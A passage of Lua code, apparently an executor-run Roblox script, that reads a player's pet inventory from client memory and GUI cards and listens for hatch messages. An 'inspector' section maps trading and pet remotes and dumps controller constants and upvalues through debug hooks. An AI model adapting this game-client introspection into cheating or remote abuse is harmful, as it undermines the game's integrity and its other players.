    local foundInventoryTable = false

    local function processPetRecord(rawKey, rec, equippedMap)
        if type(rec) == "table" then
            local rawId = rec.Name or rec.name or rec.Species or rec.species or rec.PetName or rec.petName or rec.Pet or rec.pet or rec.PetId or rec.petId or rec.ItemId or rec.Type or rec.Id or rec.id or (type(rawKey) == "string" and rawKey)
            local rawImg = extractAssetId(rec.Image or rec.image or rec.Icon or rec.AssetId)
            local known = matchKnownSecret(tostring(rawId or ""), rawImg)
            local rawRarity = tostring(rec.Rarity or rec.rarity or "")
            local isSec = (known ~= nil) or (rawRarity:lower():find("secret", 1, true) ~= nil) or (rawRarity:lower() == "leaderboard") or (rec.IsSecret == true)
            local petName = (known and known.name) or (type(rawId) == "string" and not isBogusPetName(rawId) and rawId) or nil
            if not petName or isBogusPetName(petName) then
                return
            end
            local count = tonumber(rec.Amount or rec.amount or rec.Count or rec.count or rec.Copies or rec.Stack or 1) or 1
            if type(rec.Ids) == "table" and #rec.Ids > count then
                count = #rec.Ids
            elseif type(rec.Pets) == "table" and #rec.Pets > count then
                count = #rec.Pets
            end
            if count < 1 or count > 99999 then
                count = 1
            end
            invCount = invCount + count
            local combinedVariantStr = tostring(rec.Tier or "") .. " " .. tostring(rec.Mutation or "") .. " " .. tostring(rec.Variant or "")
            local variant = detectVariantFromTable(rec, combinedVariantStr)
            local isEq = (rec.Equip == true) or (rec.Equipped == true) or (rec.equipped == true) or (equippedMap and (equippedMap[tostring(rawKey)] or (rec.Id and equippedMap[tostring(rec.Id)]) or (rec.UUID and equippedMap[tostring(rec.UUID)]))) or false
            local mult = parseFloatCompact(rec.Multiplier or rec.multiplier or rec.Power or (known and known.multiplier) or 1)
            if mult <= 0 then
                mult = 1
            end
            local power = parseFloatCompact(rec.Power or rec.power or (mult * 10))
            totalPower = totalPower + (power * count)
            local assetId = rawImg or ((variant:find("Golden", 1, true) and known and known.goldenAssetId) or (known and known.imageAssetId))
            local tier = detectTier(rawRarity) or (known and known.tier) or (isSec and "Secret" or nil)
            local sourceEgg = (type(rec.SourceEgg) == "string" and rec.SourceEgg ~= "" and rec.SourceEgg) or (known and known.egg) or nil

            if isSec then
                local aggKey = petName:lower() .. "::" .. variant:lower()
                local existing = aggregatedSecrets[aggKey]
                if existing then
                    existing.count = existing.count + count
                    existing.multiplier = math.max(existing.multiplier, mult)
                    existing.power = math.max(existing.power, power)
                    existing.isEquipped = existing.isEquipped or isEq
                    existing.imageAssetId = existing.imageAssetId or assetId
                    existing.eggSource = existing.eggSource or sourceEgg
                else
                    aggregatedSecrets[aggKey] = {
                        id = tostring(rawKey),
                        name = petName,
                        rarity = "Secret",
                        variant = variant,
                        tier = tier,
                        count = count,
                        multiplier = mult,
                        power = power,
                        isEquipped = isEq,
                        eggSource = sourceEgg,
                        imageAssetId = assetId,
                    }
                end
            end

            if isEq then
                table.insert(equippedList, {
                    id = tostring(rawKey),
                    name = petName,
                    rarity = isSec and "Secret" or "Mythic",
                    variant = variant,
                    tier = tier,
                    multiplier = mult,
                    power = power,
                    isEquipped = true,
                    imageAssetId = assetId,
                })
            end
        elseif type(rawKey) == "string" and type(rec) == "number" and rec > 0 then
            local known = matchKnownSecret(rawKey, nil)
            if known then
                invCount = invCount + rec
                local variant = detectVariant(rawKey)
                local aggKey = known.name:lower() .. "::" .. variant:lower()
                aggregatedSecrets[aggKey] = {
                    id = rawKey,
                    name = known.name,
                    rarity = "Secret",
                    variant = variant,
                    tier = known.tier or "Secret",
                    count = rec,
                    multiplier = known.multiplier or 1,
                    power = (known.multiplier or 1) * 10,
                    isEquipped = false,
                    eggSource = known.egg,
                    imageAssetId = known.imageAssetId,
                }
            end
        end
    end

    -- 1A. Try TS2 DataController:GetReplica() first!
    pcall(function()
        local repData = getPlayerDataReplica()
        if type(repData) == "table" then
            local eqMap = {}
            local petsContainer = type(repData.Pets) == "table" and repData.Pets or repData
            for _, eqKey in ipairs({ "EquippedPets", "Equipped", "ActivePets", "EquippedIds" }) do
                local eqTbl = petsContainer[eqKey] or repData[eqKey]
                if type(eqTbl) == "table" then
                    for k, v in pairs(eqTbl) do
                        if type(v) == "string" or type(v) == "number" then
                            eqMap[tostring(v)] = true
                        elseif v == true then
                            eqMap[tostring(k)] = true
                        end
                    end
                end
            end

            local skipSubKeys = {
                ["index"] = true,
                ["indextiers"] = true,
                ["indexrewards"] = true,
                ["helddigest"] = true,
                ["autodelete"] = true,
                ["equipped"] = true,
                ["equippedpets"] = true,
                ["equippedids"] = true,
                ["maxequipped"] = true,
                ["maxstorage"] = true,
            }

            if type(repData.Pets) == "table" then
                if type(repData.Pets.Owned) == "table" then
                    foundInventoryTable = true
                end
                -- Check if repData.Pets is a container with sub-tables (like Held, Owned, Storage, List, Pets, Inventory)
                for subKey, subVal in pairs(repData.Pets) do
                    local lsk = tostring(subKey):lower()
                    if type(subVal) == "table" and not skipSubKeys[lsk] then
                        for pk, pv in pairs(subVal) do
                            processPetRecord(pk, pv, eqMap)
                        end
                    end
                end
                if invCount > 0 then
                    foundInventoryTable = true
                end
            end
        end
    end)

    -- 1B. Try TS2 Controllers.Pets.InventoryController:GetStacks() if Replica yielded 0 pets
    if not foundInventoryTable or invCount == 0 then
        pcall(function()
            local controllers = ReplicatedStorage and ReplicatedStorage:FindFirstChild("Controllers")
            local petsFolder = controllers and controllers:FindFirstChild("Pets")
            local invCtrl = petsFolder and safeRequire(petsFolder:FindFirstChild("InventoryController"))
            if type(invCtrl) == "table" and type(invCtrl.GetStacks) == "function" then
                local ok, stacks = pcall(function() return invCtrl:GetStacks() end)
                if not ok or type(stacks) ~= "table" then
                    ok, stacks = pcall(function() return invCtrl.GetStacks() end)
                end
                if ok and type(stacks) == "table" then
                    for k, v in pairs(stacks) do
                        processPetRecord(k, v, nil)
                    end
                    if invCount > 0 then
                        foundInventoryTable = true
                    end
                end
            end
        end)
    end

    if foundInventoryTable then
        local secretList = {}
        for _, item in pairs(aggregatedSecrets) do
            table.insert(secretList, item)
        end
        return secretList, equippedList, invCount, totalPower
    end

    if type(getgc) ~= "function" then
        return nil, {}, 0, 0
    end

    pcall(function()
        local objs = getgc(true)
        for _, rawTbl in ipairs(objs) do
            if type(rawTbl) == "table" then
                local tbl = (type(rawget(rawTbl, "Data")) == "table" and rawget(rawTbl, "Data")) or rawTbl
                -- Fast O(1) rawget check for a PlayerData / Replica / Profile / Inventory container table
                local petsSub = rawget(tbl, "Pets")
                    or rawget(tbl, "pets")
                    or rawget(tbl, "OwnedPets")
                    or rawget(tbl, "ownedPets")
                    or rawget(tbl, "PetInventory")
                    or rawget(tbl, "Inventory")
                local equippedMap = nil
                if type(petsSub) == "table" then
                    pcall(function()
                        local eqRaw = rawget(tbl, "EquippedPets") or rawget(tbl, "equippedPets") or rawget(tbl, "Equipped")
                        if type(eqRaw) == "table" then
                            equippedMap = {}
                            for ek, ev in pairs(eqRaw) do
                                if type(ev) == "string" or type(ev) == "number" then
                                    equippedMap[tostring(ev)] = true
                                elseif (type(ek) == "string" or type(ek) == "number") and ev == true then
                                    equippedMap[tostring(ek)] = true
                                end
                            end
                        end
                    end)
                end

                if type(petsSub) == "table" then
                    -- Verify this is an owned player inventory table (not a static catalog definition table)
                    local hasPlayerContext = (rawget(tbl, "Rebirths") ~= nil)
                        or (rawget(tbl, "rebirths") ~= nil)
                        or (rawget(tbl, "Eggs") ~= nil)
                        or (rawget(tbl, "eggs") ~= nil)
                        or (rawget(tbl, "Clicks") ~= nil)
                        or (rawget(tbl, "Taps") ~= nil)
                        or (rawget(tbl, "Settings") ~= nil)
                        or (rawget(tbl, "Quests") ~= nil)
                        or (rawget(tbl, "Teams") ~= nil)
                        or (rawget(tbl, "PetTeams") ~= nil)
                        or (equippedMap ~= nil)

                    local entries = 0
                    local hasInstanceShape = false
                    local isStaticCatalog = false

                    pcall(function()
                        for k, v in pairs(petsSub) do
                            entries = entries + 1
                            if type(v) == "table" then
                                if rawget(v, "Chance") ~= nil or rawget(v, "DropChance") ~= nil or rawget(v, "Model") ~= nil or rawget(v, "Animations") ~= nil then
                                    isStaticCatalog = true
                                end
                                if rawget(v, "Equipped") ~= nil or rawget(v, "equipped") ~= nil or rawget(v, "Locked") ~= nil or rawget(v, "locked") ~= nil or rawget(v, "UUID") ~= nil or rawget(v, "UID") ~= nil or rawget(v, "Id") ~= nil or rawget(v, "id") ~= nil or rawget(v, "Name") ~= nil or rawget(v, "PetId") ~= nil or rawget(v, "Amount") ~= nil or rawget(v, "Count") ~= nil then
                                    hasInstanceShape = true
                                end
                            end
                        end
                    end)

                    if entries > 0 and not isStaticCatalog and (hasPlayerContext or hasInstanceShape) then
                        local candidateSecrets = {}
                        local candidateEquipped = {}
                        local candidateInvCount = 0
                        local candidatePower = 0

                        pcall(function()
                            for k, v in pairs(petsSub) do
                                if type(v) == "table" then
                                    local rawId = rawget(v, "Name") or rawget(v, "name") or rawget(v, "PetName") or rawget(v, "petName") or rawget(v, "PetId") or rawget(v, "petId") or rawget(v, "ItemId") or rawget(v, "Type") or rawget(v, "Id") or rawget(v, "id") or (type(k) == "string" and k)
                                    local rawImg = extractAssetId(rawget(v, "Image") or rawget(v, "image") or rawget(v, "Icon") or rawget(v, "AssetId"))
                                    local known = matchKnownSecret(tostring(rawId or ""), rawImg)
                                    local rawRarity = tostring(rawget(v, "Rarity") or rawget(v, "rarity") or "")
                                    local isSec = (known ~= nil) or (rawRarity:lower() == "secret") or (rawget(v, "IsSecret") == true)
                                    local petName = (known and known.name) or (type(rawId) == "string" and not isBogusPetName(rawId) and rawId) or nil

                                    if petName and not isBogusPetName(petName) then
                                        local count = tonumber(rawget(v, "Amount") or rawget(v, "amount") or rawget(v, "Count") or rawget(v, "count") or rawget(v, "Copies") or 1) or 1
                                        if count < 1 or count > 99999 then
                                            count = 1
                                        end
                                        candidateInvCount = candidateInvCount + count
                                        local variant = detectVariantFromTable(v, tostring(rawId or ""))
                                        local isEq = (rawget(v, "Equipped") == true) or (rawget(v, "equipped") == true) or (equippedMap and (equippedMap[tostring(k)] or (rawget(v, "UUID") and equippedMap[tostring(rawget(v, "UUID"))]))) or false
                                        local mult = parseFloatCompact(rawget(v, "Multiplier") or rawget(v, "multiplier") or (known and known.multiplier) or 1)
                                        if mult <= 0 then
                                            mult = 1
                                        end
                                        local power = parseFloatCompact(rawget(v, "Power") or rawget(v, "power") or (mult * 10))
                                        candidatePower = candidatePower + (power * count)
                                        local assetId = rawImg or (known and known.imageAssetId)
                                        local tier = detectTier(rawRarity) or (known and known.tier) or (isSec and "Secret" or nil)

                                        if isSec then
                                            local aggKey = petName:lower() .. "::" .. variant:lower()
                                            local existing = candidateSecrets[aggKey]
                                            if existing then
                                                existing.count = existing.count + count
                                                existing.multiplier = math.max(existing.multiplier, mult)
                                                existing.power = math.max(existing.power, power)
                                                existing.isEquipped = existing.isEquipped or isEq
                                                existing.imageAssetId = existing.imageAssetId or assetId
                                            else
                                                candidateSecrets[aggKey] = {
                                                    id = tostring(k),
                                                    name = petName,
                                                    rarity = "Secret",
                                                    variant = variant,
                                                    tier = tier,
                                                    count = count,
                                                    multiplier = mult,
                                                    power = power,
                                                    isEquipped = isEq,
                                                    eggSource = known and known.egg or nil,
                                                    imageAssetId = assetId,
                                                }
                                            end
                                        end

                                        if isEq then
                                            table.insert(candidateEquipped, {
                                                id = tostring(k),
                                                name = petName,
                                                rarity = isSec and "Secret" or "Mythic",
                                                variant = variant,
                                                tier = tier,
                                                multiplier = mult,
                                                power = power,
                                                isEquipped = true,
                                                imageAssetId = assetId,
                                            })
                                        end
                                    end
                                end
                            end
                        end)

                        local secTypes = 0
                        for _, _ in pairs(candidateSecrets) do
                            secTypes = secTypes + 1
                        end
                        if secTypes > 0 or (hasPlayerContext and candidateInvCount > invCount) then
                            foundInventoryTable = true
                            aggregatedSecrets = candidateSecrets
                            equippedList = candidateEquipped
                            invCount = candidateInvCount
                            totalPower = candidatePower
                        end
                    end
                end
            end
        end
    end)

    if not foundInventoryTable then
        return nil, {}, 0, 0
    end
    local secretList = {}
    for _, item in pairs(aggregatedSecrets) do
        table.insert(secretList, item)
    end
    return secretList, equippedList, invCount, totalPower
end

-- Ignored non-pet ScreenGuis when scanning PlayerGui
local IGNORED_SCREENGUIS = {
    ["clanislandconcept"] = true,
    ["playerlist"] = true,
    ["topbarstandard"] = true,
    ["topbarcentered"] = true,
    ["topbarstandardclipped"] = true,
    ["topbarcenteredclipped"] = true,
    ["codes"] = true,
    ["skilltreegui"] = true,
    ["trading"] = true,
    ["giveawayhud"] = true,
    ["giveawaydraw"] = true,
    ["digminigame"] = true,
    ["wavedefense"] = true,
    ["colosseumrewards"] = true,
    ["onboarding"] = true,
    ["onboardingintro"] = true,
    ["dialogs"] = true,
    ["dialog"] = true,
    ["globalmessage"] = true,
    ["notifications"] = true,
    ["hatching"] = true,
    ["hatchscreen"] = true,
    ["egg opening stuff"] = true,
}

-- Finds all candidate Pet Inventory / PetTeam containers in PlayerGui (works even when ScreenGui is closed!)
local function findPetContainers()
    if CONFIG.PATHS.PetListGui then
        local explicit = resolvePath(CONFIG.PATHS.PetListGui)
        return explicit and { explicit } or {}
    end
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not pg then
        return {}
    end
    local containers = {}
    local seen = {}

    local function addContainer(inst)
        if inst and not seen[inst] then
            seen[inst] = true
            table.insert(containers, inst)
        end
    end

    for _, gui in ipairs(pg:GetChildren()) do
        if gui:IsA("ScreenGui") and not IGNORED_SCREENGUIS[gui.Name:lower()] then
            local gName = gui.Name:lower()
            for _, desc in ipairs(gui:GetDescendants()) do
                if desc:IsA("ScrollingFrame") or (desc:IsA("Frame") and desc:FindFirstChildWhichIsA("UIGridLayout")) then
                    local fullLower = desc:GetFullName():lower()
                    if not (fullLower:find("rebirth", 1, true)
                        or fullLower:find("quest", 1, true)
                        or fullLower:find("badge", 1, true)
                        or fullLower:find("clan", 1, true)
                        or fullLower:find("shop", 1, true)
                        or fullLower:find("index", 1, true)
                        or fullLower:find("catalog", 1, true)) then
                        if gName:find("pet", 1, true)
                            or fullLower:find("pet", 1, true)
                            or fullLower:find("inventory", 1, true)
                            or fullLower:find("items.list", 1, true) then
                            addContainer(desc)
                        end
                    end
                end
            end
        end
    end
    return containers
end

local TEMPLATE_CARD_NAMES = {
    ["template"] = true,
    ["sample"] = true,
    ["example"] = true,
    ["prefab"] = true,
    ["default"] = true,
    ["placeholder"] = true,
    ["empty"] = true,
    ["slottemplate"] = true,
    ["pettemplate"] = true,
    ["itemtemplate"] = true,
}

-- Collects pets from PlayerGui containers + merges with getgc client inventory
-- Returns: (secretPetsOrNil, equippedPets, totalInvCount, totalPetPower)
local function collectPetsReadOnly()
    discoverGamePetCatalog()

    -- 1. Try reading full inventory from client memory (getgc) first
    local gcSecrets, gcEquipped, gcInvCount, gcPower = collectPetsFromGc()

    -- 2. Scan PlayerGui pet containers (both visible and hidden!)
    local containers = findPetContainers()
    local guiSecretsByKey = {}
    local guiEquipped = {}
    local guiInvCount = 0
    local guiPower = 0
    local anyContainerVisible = false
    local seenCardInstances = {}

    for _, container in ipairs(containers) do
        if isGuiActuallyVisible(container) then
            anyContainerVisible = true
        end
        for _, card in ipairs(container:GetChildren()) do
            if card:IsA("GuiObject") and not card:IsA("UILayout") and not seenCardInstances[card] then
                local cNameLower = card.Name:lower()
                if not TEMPLATE_CARD_NAMES[cNameLower] and not cNameLower:find("template", 1, true) then
                    seenCardInstances[card] = true
                    local labels = {}
                    local assetId = nil
                    local isEquipped = false
                    local viewportModelName = nil
                    local attrJoined = ""

                    local okAttr, cAttrs = pcall(function() return card:GetAttributes() end)
                    if okAttr and type(cAttrs) == "table" then
                        for ak, av in pairs(cAttrs) do
                            attrJoined = attrJoined .. " | " .. tostring(ak) .. ":" .. tostring(av)
                            local lk = tostring(ak):lower()
                            if (lk == "equipped" or lk == "isequipped") and av == true then
                                isEquipped = true
                            end
                            local aid = extractAssetId(av)
                            if aid and not assetId then
                                assetId = aid
                            end
                        end
                    end

                    for _, desc in ipairs(card:GetDescendants()) do
                        if (desc:IsA("TextLabel") or desc:IsA("TextButton")) and desc.Text and desc.Text ~= "" then
                            table.insert(labels, desc.Text)
                        elseif (desc:IsA("ImageLabel") or desc:IsA("ImageButton")) and desc.Image and desc.Image ~= "" then
                            local extracted = extractAssetId(desc.Image)
                            if extracted then
                                if not assetId or ASSET_TO_SECRET[tostring(extracted)] then
                                    assetId = extracted
                                end
                            end
                            local nm = desc.Name:lower()
                            if (nm:find("equip", 1, true) or nm:find("check", 1, true)) and desc.Visible then
                                isEquipped = true
                            end
                        elseif desc:IsA("ViewportFrame") then
                            local mdl = desc:FindFirstChildOfClass("Model") or desc:FindFirstChildOfClass("MeshPart")
                            if mdl and mdl.Name ~= "" and mdl.Name ~= "Camera" then
                                viewportModelName = mdl.Name
                            end
                        elseif desc:IsA("ValueBase") and desc.Value ~= nil then
                            table.insert(labels, tostring(desc.Value))
                        end
                    end

                    local joined = table.concat(labels, " | ") .. " | " .. card.Name .. " | " .. (viewportModelName or "") .. attrJoined
                    local lowerJoined = joined:lower()
                    local matchedKnown = matchKnownSecret(joined, assetId)
                        or (viewportModelName and matchKnownSecret(viewportModelName, assetId))
                        or matchKnownSecret(card.Name, assetId)

                    local isSecret = (matchedKnown ~= nil) or (lowerJoined:find("secret", 1, true) ~= nil)
                    local candidateName = (matchedKnown and matchedKnown.name)
                        or viewportModelName
                        or labels[1]
                        or card.Name

                    if candidateName and not isBogusPetName(candidateName) then
                        guiInvCount = guiInvCount + 1
                        local variant = detectVariant(joined)
                        local tier = detectTier(joined) or (matchedKnown and matchedKnown.tier) or (isSecret and "Secret" or nil)

                        local mult = (matchedKnown and matchedKnown.multiplier) or 1.0
                        local multLabelIdx = nil
                        local count = 1

                        -- Pass 1: Identify multiplier label (supports both "x25,000" and "25,000x")
                        for idx, txt in ipairs(labels) do
                            local trimmed = txt:gsub("^%s+", ""):gsub("%s+$", "")
                            local mPrefix = trimmed:match("^[xX]%s*([%d%.,]+[a-zA-Z]*)$")
                            local mSuffix = trimmed:match("^([%d%.,]+[a-zA-Z]*)%s*[xX]$")
                            local matchedStr = mSuffix or mPrefix
                            if matchedStr then
                                local val = parseFloatCompact(matchedStr)
                                if val > mult then
                                    mult = val
                                    multLabelIdx = idx
                                end
                            end
                        end

                        -- Pass 2: Read stack count ONLY from a distinct label (never the multiplier label)
                        for idx, txt in ipairs(labels) do
                            if idx ~= multLabelIdx then
                                local mStack = txt:match("^%s*[xX](%d+)%s*$")
                                if mStack then
                                    local n = tonumber(mStack)
                                    if n and n >= 1 and n <= 9999 then
                                        count = n
                                        break
                                    end
                                end
                            end
                        end

                        local power = mult * 10
                        guiPower = guiPower + (power * count)
                        local finalAssetId = assetId or (matchedKnown and matchedKnown.imageAssetId)

                        if isSecret then
                            local aggKey = candidateName:lower() .. "::" .. variant:lower()
                            local existing = guiSecretsByKey[aggKey]
                            if existing then
                                existing.count = existing.count + count
                                existing.multiplier = math.max(existing.multiplier, mult)
                                existing.power = math.max(existing.power, power)
                                existing.isEquipped = existing.isEquipped or isEquipped
                                existing.imageAssetId = existing.imageAssetId or finalAssetId
                            else
                                guiSecretsByKey[aggKey] = {
                                    id = card.Name,
                                    name = candidateName,
                                    rarity = "Secret",
                                    variant = variant,
                                    tier = tier,
                                    count = count,
                                    multiplier = mult,
                                    power = power,
                                    isEquipped = isEquipped,
                                    eggSource = matchedKnown and matchedKnown.egg or nil,
                                    imageAssetId = finalAssetId,
                                }
                            end
                        end

                        if isEquipped then
                            table.insert(guiEquipped, {
                                id = card.Name,
                                name = candidateName,
                                rarity = isSecret and "Secret" or "Mythic",
                                variant = variant,
                                tier = tier,
                                multiplier = mult,
                                power = power,
                                isEquipped = true,
                                imageAssetId = finalAssetId,
                            })
                        end
                    end
                end
            end
        end
    end

    local guiSecrets = {}
    for _, item in pairs(guiSecretsByKey) do
        table.insert(guiSecrets, item)
    end

    -- Prefer whichever source discovered more Secret pets; preserve AFK Closed-Inventory Guard when neither found an open inventory
    if gcSecrets and #gcSecrets >= #guiSecrets and #gcSecrets > 0 then
        return gcSecrets, (#gcEquipped > 0 and gcEquipped or guiEquipped), math.max(gcInvCount, guiInvCount), math.max(gcPower, guiPower)
    end
    if #guiSecrets > 0 or anyContainerVisible then
        return guiSecrets, guiEquipped, guiInvCount, guiPower
    end
    if gcSecrets then
        return gcSecrets, gcEquipped, gcInvCount, gcPower
    end
    return nil, {}, 0, 0
end

-- Collects active boosts/potions from optional BoostListGui
local function collectActiveBoosts()
    local boosts = {}
    local boostGui = CONFIG.PATHS.BoostListGui and resolvePath(CONFIG.PATHS.BoostListGui) or nil
    if not boostGui or not isGuiActuallyVisible(boostGui) then
        return boosts
    end
    for _, item in ipairs(boostGui:GetChildren()) do
        if item:IsA("GuiObject") and item.Visible then
            local nameTxt = item.Name
            local remSec = 0
            for _, d in ipairs(item:GetDescendants()) do
                if d:IsA("TextLabel") and d.Text ~= "" then
                    local mm, ss = d.Text:match("(%d+):(%d+)")
                    if mm and ss then
                        remSec = (tonumber(mm) or 0) * 60 + (tonumber(ss) or 0)
                    else
                        nameTxt = d.Text
                    end
                end
            end
            table.insert(boosts, { name = nameTxt, remainingSec = remSec })
        end
    end
    return boosts
end

-- AFK Hatch Popup & Read-Only System Chat Listener
local function isBannerForAnotherPlayer(rawText)
    local lower = (rawText or ""):lower()
    local myName = (LocalPlayer.Name or ""):lower()
    local myDisplay = (LocalPlayer.DisplayName or ""):lower()
    if (myName ~= "" and lower:find(myName, 1, true)) or (myDisplay ~= "" and lower:find(myDisplay, 1, true)) then
        return false
    end
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local pName = (plr.Name or ""):lower()
            local pDisp = (plr.DisplayName or ""):lower()
            if (pName ~= "" and #pName >= 3 and lower:find(pName, 1, true))
                or (pDisp ~= "" and #pDisp >= 3 and lower:find(pDisp, 1, true)) then
                return true
            end
        end
    end
    return false
end

local function tryQueueHatchFromText(rawText)
    if type(rawText) ~= "string" or rawText == "" then
        return
    end
    if isBannerForAnotherPlayer(rawText) then
        return
    end
    local lower = rawText:lower()
    -- Reject negative/placeholder UI labels like "You haven't hatched a Secret yet!" or "Secret Skip"
    if lower:find("haven't", 1, true)
        or lower:find("havent", 1, true)
        or lower:find("no secret", 1, true)
        or lower:find("not hatched", 1, true)
        or lower:find("secret skip", 1, true)
        or lower:find("secret luck", 1, true) then
        return
    end
    if not lower:find("hatched", 1, true) then
        return
    end

    local matchedKnown = matchKnownSecret(rawText, nil)
    local extractedName = nil
    if not matchedKnown then
        if not lower:find("secret", 1, true) then
            return
        end
        extractedName = rawText:match("[Hh]atched%s+a?n?%s*[Ss]ecret%s+([A-Za-z0-9%s%-']+)")
            or rawText:match("[Hh]atched%s+a?n?%s*([A-Za-z0-9%s%-']+)%s*%([Ss]ecret%)")
    end

    local petName = (matchedKnown and matchedKnown.name) or (extractedName and extractedName:gsub("^%s+", ""):gsub("%s+$", "")) or nil
    if not petName or isBogusPetName(petName) then
        return
    end

    local variant = detectVariant(rawText)
    local odds = rawText:match("(1%s+in%s+[%d%.,]+[KMBT]?)")

    table.insert(pendingHatches, {
        petName = petName,
        rarity = "Secret",
        variant = variant,
        tier = detectTier(rawText) or (matchedKnown and matchedKnown.tier) or "Secret",
        eggName = matchedKnown and matchedKnown.egg or nil,
        odds = odds,
        imageAssetId = matchedKnown and matchedKnown.imageAssetId or nil,
        timestamp = os.time(),
    })
end

local function attachHatchListeners()
    -- 1. TextChatService read-only listener
    if TextChatService then
        local ok, conn = pcall(function()
            return TextChatService.MessageReceived:Connect(function(msg)
                if _G.__TapSimTrackStats_Token ~= RUN_TOKEN then
                    return
                end
                local txt = msg and msg.Text or ""
                if txt:lower():find(LocalPlayer.Name:lower(), 1, true) or txt:lower():find(LocalPlayer.DisplayName:lower(), 1, true) then
                    tryQueueHatchFromText(txt)
                end
            end)
        end)
        if ok and conn then
            table.insert(connections, conn)
        end
    end

    -- 2. PlayerGui hatch banner listener
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if pg then
        local conn = pg.DescendantAdded:Connect(function(desc)
            if _G.__TapSimTrackStats_Token ~= RUN_TOKEN then
                return
            end
            if desc:IsA("TextLabel") then
                task.delay(0.1, function()
                    if desc and desc.Parent and desc.Text then
                        local gName = desc:FindFirstAncestorOfClass("ScreenGui")
                        local scope = gName and gName.Name:lower() or ""
                        if scope:find("hatch", 1, true) or scope:find("notif", 1, true) or desc.Text:lower():find("hatched", 1, true) then
                            tryQueueHatchFromText(desc.Text)
                        end
                    end
                end)
            end
        end)
        table.insert(connections, conn)
    end
end

-- Inspector Mode: dumps bounded read-only hierarchy (including RightHud, PetTeams, Game, ReplicatedStorage & getgc summary)
local function sendInspectorSnapshot()
    discoverGamePetCatalog()
    local dump = {
        scriptVersion = SCRIPT_VERSION,
        leaderstats = {},
        attributes = {},
        candidatePetGuis = {},
        petUiDetails = {},
        replicatedStorageItems = {},
        screenGuis = {},
    }

    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        for _, c in ipairs(ls:GetChildren()) do
            if c:IsA("ValueBase") then
                dump.leaderstats[c.Name] = tostring(c.Value)
            end
        end
    end

    local okA, attrs = pcall(function() return LocalPlayer:GetAttributes() end)
    if okA and type(attrs) == "table" then
        for k, v in pairs(attrs) do
            dump.attributes[tostring(k)] = tostring(v)
        end
    end

    if ReplicatedStorage then
        dump.petModules = {}
        local probePaths = {
            "Controllers.Pets",
            "Controllers.Trading",
            "Controllers.Core",
            "Controllers.Common",
            "Controllers.Game",
            "Controllers.Items",
            "Controllers.UI",
            "Shared.Pets",
            "Shared.Trading",
            "Shared.Core",
            "Shared.Items",
            "Packages",
            "Modules.Client",
            "Content.Pets",
        }
        for _, relPath in ipairs(probePaths) do
            pcall(function()
                local cur = ReplicatedStorage
                for seg in relPath:gmatch("[^%.]+") do
                    cur = cur and cur:FindFirstChild(seg)
                end
                if cur then
                    local childrenInfo = {}
                    for idx, ch in ipairs(cur:GetChildren()) do
                        if idx <= 35 then
                            local entry = { name = ch.Name, className = ch.ClassName }
                            if ch:IsA("ModuleScript") and relPath ~= "Content.Pets" then
                                local done = false
                                local reqOk, reqRes = false, nil
                                task.spawn(function()
                                    reqOk, reqRes = pcall(require, ch)
                                    done = true
                                end)
                                local waited = 0
                                while not done and waited < 0.2 do
                                    task.wait(0.02)
                                    waited = waited + 0.02
                                end
                                if done and reqOk and type(reqRes) == "table" then
                                    local keys = {}
                                    local count = 0
                                    for k, v in pairs(reqRes) do
                                        count = count + 1
                                        if count <= 30 then
                                            local vDesc = type(v)
                                            if type(v) == "table" then
                                                local subKeys = {}
                                                local sc = 0
                                                for sk, sv in pairs(v) do
                                                    sc = sc + 1
                                                    if sc <= 12 then
                                                        table.insert(subKeys, tostring(sk) .. ":" .. type(sv))
                                                    end
                                                end
                                                vDesc = "table{" .. table.concat(subKeys, ",") .. "}"
                                            elseif type(v) == "string" or type(v) == "number" or type(v) == "boolean" then
                                                vDesc = tostring(v)
                                            end
                                            table.insert(keys, tostring(k) .. "=" .. vDesc)
                                        end
                                    end
                                    entry.moduleKeys = keys
                                end
                            end
                            table.insert(childrenInfo, entry)
                        end
                    end
                    dump.petModules[relPath] = childrenInfo
                end
            end)
        end

        -- Also dump RemoteServices children (TradingService, PetService, etc.) for exact RF/RE discovery
        dump.remotesList = {}
        dump.remoteServices = {}
        pcall(function()
            local rsFolder = ReplicatedStorage:FindFirstChild("RemoteServices")
            if rsFolder then
                for _, svc in ipairs(rsFolder:GetChildren()) do
                    local svcRemotes = {}
                    for _, d in ipairs(svc:GetDescendants()) do
                        if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
                            table.insert(svcRemotes, d.Parent.Name .. "." .. d.Name .. " (" .. d.ClassName .. ")")
                        end
                    end
                    dump.remoteServices[svc.Name] = svcRemotes
                end
            end
            for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
                if (desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction")) and #dump.remotesList < 250 then
                    local rel = desc:GetFullName():gsub("^ReplicatedStorage%.", "")
                    if rel:lower():find("trad", 1, true) or rel:lower():find("pet", 1, true) or rel:lower():find("inv", 1, true) or rel:lower():find("setting", 1, true) or rel:lower():find("equip", 1, true) or rel:lower():find("lock", 1, true) then
                        table.insert(dump.remotesList, {
                            name = desc.Name,
                            className = desc.ClassName,
                            path = rel,
                        })
                    end
                end
            end

            -- Inspect constants/protos/upvalues/debugState of TradingController, InventoryController
            dump.controllerInternals = {}
            local getConsts = (type(debug) == "table" and debug.getconstants) or getconstants
            local getProtos = (type(debug) == "table" and debug.getprotos) or getprotos
            local getUpvals = (type(debug) == "table" and debug.getupvalues) or getupvalues

            local function extractFnStrings(fnVal, depth, visitedFns)
                depth = depth or 0
                visitedFns = visitedFns or {}
                if type(fnVal) ~= "function" or visitedFns[fnVal] or depth > 2 then
                    return {}
                end
                visitedFns[fnVal] = true
                local cList = {}
                pcall(function()
                    if type(getConsts) == "function" then
                        for _, c in pairs(getConsts(fnVal)) do
                            if type(c) == "string" or type(c) == "number" then
                                table.insert(cList, tostring(c))
                            end
                        end
                    end
                    if type(getProtos) == "function" then
                        for _, p in pairs(getProtos(fnVal)) do
                            if type(getConsts) == "function" then
                                for _, pc in pairs(getConsts(p)) do
                                    if type(pc) == "string" or type(pc) == "number" then
                                        table.insert(cList, "proto:" .. tostring(pc))
                                    end
                                end
                            end
                        end
                    end
                    if type(getUpvals) == "function" and depth < 2 then
                        for uk, uv in pairs(getUpvals(fnVal)) do
                            if type(uv) == "function" then
                                local sub = extractFnStrings(uv, depth + 1, visitedFns)
